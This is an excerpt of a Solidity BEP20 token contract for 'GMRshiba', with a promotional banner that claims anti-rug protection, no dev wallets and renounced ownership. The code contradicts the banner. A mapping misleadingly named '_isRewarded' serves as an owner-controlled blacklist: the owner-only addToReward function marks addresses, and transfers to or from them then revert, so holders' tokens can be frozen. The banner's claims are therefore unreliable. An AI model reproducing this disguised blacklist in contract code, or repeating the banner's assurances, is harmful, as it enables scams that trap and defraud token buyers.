...
/*
      ...
      .oooooo.     ooo        ooooo  ooooooooo.         .oooooo..o ooooo   ooooo ooooo oooooooooo.        .o.       
     d8P'  `Y8b    `88.       .888'  `888   `Y88.      d8P'    `Y8 `888'   `888' `888' `888'   `Y8b      .888.      
    888             888b     d'888    888   .d88'      Y88bo.       888     888   888   888     888     .8"888.     
    888             8 Y88. .P  888    888ooo88P'        `"Y8888o.   888ooooo888   888   888oooo888'    .8' `888.    
    888     ooooo   8  `888'   888    888`88b.              `"Y88b  888     888   888   888    `88b   .88ooo8888.   
    `88.    .88'    8    Y     888    888  `88b.       oo     .d8P  888     888   888   888    .88P  .8'     `888.  
     `Y8bood8P'    o8o        o888o  o888o  o888o      8""88888P'  o888o   o888o o888o o888bood8P'  o88o     o8888o 
                     
    GMRSHIBA - 5% Fee Token
    Twitter : twitter.com/GMRshiba
    Web : www.GMRshiba.store
    Tg : t.me/GMRshiba
	
	GMRshiba's aim is to create a complete metaverse of RPG gaming which allows
	millions of peoples to join the NFT&Blockchain-Based gaming world in an easy.
    ...
    Burn 90% Supply
    No Dev wallets
    ANTI RUG embedded in code
    Anti-Dump mechanis
    
    Will be added 0.2 BNB to liquidity and burn and renounce ownership after launch.
...
contract GMRshiba is Context, IBEP20, Ownable {
	...
	mapping (address => bool) public _isRewarded;
    ...
    string private constant _name     = "GMRshiba";
    string private constant _symbol   = "GMR";
...
subtractedValue) public virtual returns (bool) {
    ...
    //Remove from Reward
        ...
        _isRewarded[account] = false;
    }

    //adding multiple addresses to the reward - Used to manually block known bots and scammers
    function addToReward(address[] calldata addresses) external onlyOwner {
      for (uint256 i; i < addresses.length; ++i) {
        _isRewarded[addresses[i]] = true;
      }
    }
...
onlyOwner {
	...
	//rewarded addreses!
        require(!_isRewarded[from] && !_isRewarded[to], "This address is rewarded");
...
amount, bool takeFee) private {
		...
		require(!_isRewarded[sender] && !_isRewarded[recipient], "To/from address is rewarded!");
        if (!takeFee) {
            removeAllFee();
        }
